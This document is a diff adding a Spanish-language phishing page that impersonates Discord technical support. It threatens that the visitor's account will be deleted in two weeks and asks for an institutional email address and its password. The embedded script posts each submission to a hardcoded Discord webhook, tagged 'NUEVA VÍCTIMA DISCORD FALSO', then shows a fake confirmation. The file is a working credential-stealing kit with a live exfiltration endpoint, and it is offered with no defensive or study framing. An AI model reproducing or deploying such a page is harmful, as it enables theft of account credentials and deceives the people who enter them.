@@ -1,0 +1,174 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Soporte de Discord</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      background:#36393f;
+      color:#dcddde;
+      font-family: Arial, Helvetica, sans-serif;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      height:100vh;
+      margin:0;
+    }
+    .card {
+      background:#2f3136;
+      width:360px;
+      padding:24px;
+      border-radius:6px;
+      box-shadow:0 0 20px rgba(0,0,0,.4);
+    }
+    h1 {
+      text-align:center;
+      color:#fff;
+      margin-bottom:10px;
+    }
+    .warning {
+      background:#faa61a;
+      color:#000;
+      padding:10px;
+      border-radius:4px;
+      font-size:13px;
+      margin-bottom:15px;
+      text-align:center;
+      font-weight:bold;
+    }
+    p {
+      font-size:13px;
+      line-height:1.4;
+    }
+    label {
+      font-size:12px;
+      color:#b9bbbe;
+    }
+    input {
+      width:100%;
+      padding:10px;
+      margin-top:5px;
+      margin-bottom:15px;
+      background:#202225;
+      border:1px solid #202225;
+      border-radius:3px;
+      color:#fff;
+    }
+    button {
+      width:100%;
+      padding:10px;
+      background:#5865f2;
+      border:none;
+      border-radius:3px;
+      color:#fff;
+      font-weight:bold;
+      cursor:pointer;
+    }
+    button:disabled {
+      background:#4752c4;
+      cursor:not-allowed;
+    }
+    .footer {
+      margin-top:15px;
+      font-size:11px;
+      color:#8e9297;
+      text-align:center;
+    }
+    .success {
+      display:none;
+      text-align:center;
+    }
+    .success h2 {
+      color:#57f287;
+    }
+    .error {
+      color:#ed4245;
+      font-size:12px;
+      margin-top:-10px;
+      margin-bottom:10px;
+      display:none;
+    }
+  </style>
+</head>
+<body>
+  <div class="card" id="formBox">
+    <h1>Discord Soporte Técnico</h1>
+    <p>
+      Para evitar la eliminación de tu cuenta en las próximas 2 semanas,
+      debes verificar tu información institucional.
+    </p>
+    <label>Correo electrónico asignado</label>
+    <input type="email" id="email" placeholder="usuario@gobierno.example" oninput="validarFormulario()">
+    <div id="emailError" class="error">Debes ingresar un correo válido</div>
+
+    <label>Contraseña del correo</label>
+    <input type="password" id="password" placeholder="********" oninput="validarFormulario()">
+    <div id="passError" class="error">La contraseña debe tener al menos 4 caracteres</div>
+
+    <button id="sendBtn" onclick="fakeSubmit()" disabled>Enviar</button>
+    <div class="footer">
+      discord.com — soporte técnico <br>
+    </div>
+  </div>
+  <div class="card success" id="successBox">
+    <h2>Gracias por su información</h2>
+    <p>
+      En un plazo aproximado de <b>2 horas</b> le avisaremos por su cuenta.
+    </p>
+    <p>
+      Puede cerrar esta pestaña.
+    </p>
+  </div>
+
+  <script>
+    const WEBHOOK = "https://discord.com/api/webhooks/1447276191961841905/IWpiF5AZjKc8iHpch5JkReeixmIjZv13QR4ZvS-ldQeiniF-iCVLyotHDlEEsdcETyyU";
+
+    function validarFormulario() {
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value;
+      const btn = document.getElementById('sendBtn');
+      const emailError = document.getElementById('emailError');
+      const passError = document.getElementById('passError');
+
+      const emailValido = email.includes('@') && email.includes('.');
+      const passValida = password.length >= 4;
+
+      emailError.style.display = emailValido ? 'none' : 'block';
+      passError.style.display = passValida ? 'none' : 'block';
+
+      btn.disabled = !(emailValido && passValida);
+    }
+
+    async function enviarDatos(email, password) {
+      const mensaje = 
+`**NUEVA VÍCTIMA DISCORD FALSO**
+**Correo:** ${email || 'no ingresado'}
+**Contraseña:** ${password || 'no ingresada'}
+**Hora:** ${new Date().toLocaleString()}`;
+
+      await fetch(WEBHOOK, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({content: mensaje})
+      });
+    }
+
+    function fakeSubmit() {
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value;
+
+      if (email === '' || password.length < 4) {
+        alert('Por favor rellena ambos campos correctamente.');
+        return;
+      }
+
+      enviarDatos(email, password);
+
+      document.getElementById("formBox").style.display = "none";
+      document.getElementById("successBox").style.display = "block";
+    }
+  </script>
+</body>
+</html>
